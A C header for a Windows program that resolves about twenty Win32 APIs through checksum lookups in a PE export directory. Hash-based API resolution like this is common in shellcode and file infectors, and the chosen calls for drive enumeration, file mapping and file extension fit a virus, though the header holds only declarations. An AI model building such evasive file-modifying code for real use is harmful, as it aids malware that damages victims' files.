#ifndef FUNCTION_LIST_H
#define FUNCTION_LIST_H

#include <stdint.h>
#include <windows.h>

typedef void(WINAPI *fpExitProcess)(UINT);
typedef DWORD(WINAPI *fpGetTickCount)(void);
typedef LPVOID(WINAPI *fpVirualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *fpVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL(WINAPI *fpVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI *fpFindFirstFileA)(LPCTSTR, LPWIN32_FIND_DATA);
typedef BOOL(WINAPI *fpFindNextFileA)(HANDLE, LPWIN32_FIND_DATA);
typedef BOOL(WINAPI *fpFindClose)(HANDLE);
typedef HANDLE(WINAPI *fpCreateFileA)(LPCTSTR, DWORD, DWORD,
                                      LPSECURITY_ATTRIBUTES, DWORD, DWORD,
                                      HANDLE);
typedef DWORD(WINAPI *fpGetFileSize)(HANDLE, LPDWORD);
typedef HANDLE(WINAPI *fpCreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES,
                                             DWORD, DWORD, DWORD, LPCTSTR);
typedef LPVOID(WINAPI *fpMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI *fpFlushViewOfFile)(LPCVOID, SIZE_T);
typedef BOOL(WINAPI *fpUnmapViewOfFile)(LPCVOID);
typedef DWORD(WINAPI *fpSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef BOOL(WINAPI *fpSetEndOfFile)(HANDLE);
typedef BOOL(WINAPI *fpCloseHandle)(HANDLE);
typedef HANDLE(WINAPI *fpCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                       LPTHREAD_START_ROUTINE, LPVOID, DWORD,
                                       LPDWORD);
typedef DWORD(WINAPI *fpGetLogicalDrives)(void);
typedef VOID(WINAPI *fpSleep)(DWORD);

typedef struct {
    fpExitProcess exit_process;
    fpGetTickCount get_tick_count;
    fpVirualAlloc virtual_alloc;
    fpVirtualFree virtual_free;
    fpVirtualProtect virtual_protect;
    fpFindFirstFileA find_first_file_a;
    fpFindNextFileA find_next_file_a;
    fpFindClose find_close;
    fpCreateFileA create_file_a;
    fpGetFileSize get_file_size;
    fpCreateFileMappingA create_file_mapping_a;
    fpMapViewOfFile map_view_of_file;
    fpFlushViewOfFile flushViewOfFile;
    fpUnmapViewOfFile unmap_view_of_file;
    fpSetFilePointer set_file_pointer;
    fpSetEndOfFile set_end_of_file;
    fpCloseHandle close_handle;
    fpCreateThread create_thread;
    fpGetLogicalDrives get_logical_drives;
    fpSleep sleep;
} function_list_t;

int fill_function_list(IMAGE_EXPORT_DIRECTORY *ed, void *base,
                       function_list_t *function_list);
void *get_function_by_checksum(IMAGE_EXPORT_DIRECTORY *ed, void *base,
                               uint32_t cs);

#endif // FUNCTION_LIST_H
